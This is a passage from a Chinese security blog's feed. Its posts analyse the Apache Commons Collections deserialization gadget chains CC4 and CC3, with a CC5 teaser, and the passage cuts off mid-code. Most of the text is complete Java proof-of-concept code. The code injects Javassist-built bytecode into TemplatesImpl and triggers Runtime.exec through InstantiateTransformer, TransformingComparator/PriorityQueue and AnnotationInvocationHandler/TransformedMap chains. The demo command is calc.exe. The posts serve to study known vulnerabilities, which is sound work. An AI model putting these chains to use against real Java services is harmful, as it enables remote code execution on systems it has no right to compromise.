&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在CC5链中&lt;code&gt;ysoserial&lt;/code&gt;给出的提示是需要JDK1.8并且&lt;code&gt;SecurityManager&lt;/code&gt;需要是关闭的。&lt;/p&gt;
&lt;p&gt;关于SecurityManager的介绍可以看下面的文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wly1-6/p/10291202.html&quot;&gt;https://www.cnblogs.com/wly1-6/p/10291202.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections4分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T15:07:35.000Z</published>
    <updated>2022-06-04T15:47:59.631Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接</p><span id="more"></span><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>根据<code>TransformingComparator</code> 利用链完成调用。</p><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析过程就不写了，和之前的链是一样的分析过程，只是触发调用 <code>transformerChain.transform()</code>方法采用的是另外一种方法，即<code>TransformingComparator.compare()</code>。</p><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604215447007-1005138662.png" alt="image-20220604215445704"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14032604.html">https://www.cnblogs.com/nice0e3/p/14032604.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections3分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T12:16:12.000Z</published>
    <updated>2022-06-04T15:45:14.983Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>cc3链可以说是cc1和cc2链的结合，下面进行分析。</p><span id="more"></span><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>Commons Collections</code> 中提供了一个 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 类，其实现了 <code>Transformer</code> 接口，并且该类有一个对外公开的构造方法，可以通过传入paramTypes和args对<code>this.iParamTypes</code> 和 <code>this.iArgs</code> 赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604203632873-572689021.png" alt="image-20220604203632075"></p><p>在上图还可以看到，存在<code>InstantiateTransformer#transform()</code>方法，该方法可以通过反射实例化一个对象并且返回。</p><p>此外，我们发现 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 类的构造方法中存在一处 <code>newTransformer()</code> 调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604204348803-761573955.png" alt="image-20220604204347822"></p><p>根据前面cc2链的利用思路，如果我们可以通过 <code>InstantiateTransformer.transform()</code> 方法实例化 <code>TrAXFilter</code> 类，在实例化的过程中，如果我们将 <code>TemplatesImpl</code> 类的对象传入 <code>TrAXFilter</code> 的构造方法，那我们就可以实现前面 cc2链中<code>TemplatesImpl.newTransformer()</code> 方法的调用了。</p><h3 id="InstantiateTransformer-利用链"><a href="#InstantiateTransformer-利用链" class="headerlink" title="InstantiateTransformer 利用链"></a>InstantiateTransformer 利用链</h3><p>对于 <code>InstantiateTransformer.transform()</code> 方法的调用思路，我们可以参考cc1链。</p><p>如下为poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCOriginal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是怎么自动触发调用 <code>transformerChain.transform()</code>方法的问题，根据我们前面cc1和cc2学习到的思路，一共有三种方法可以触发：</p><ul><li>TransformedMap 利用链：<code>TransformedMap.checkSetValue()</code></li><li>LazyMap 利用链：<code>LazyMap.get()</code></li><li>TransformingComparator 利用链：<code>TransformingComparator.compare()</code>（这种思路是cc4中的）</li></ul><h3 id="根据-TransformedMap-利用链完成调用"><a href="#根据-TransformedMap-利用链完成调用" class="headerlink" title="根据 TransformedMap 利用链完成调用"></a>根据 TransformedMap 利用链完成调用</h3><p>根据前面的学习，直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObject);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 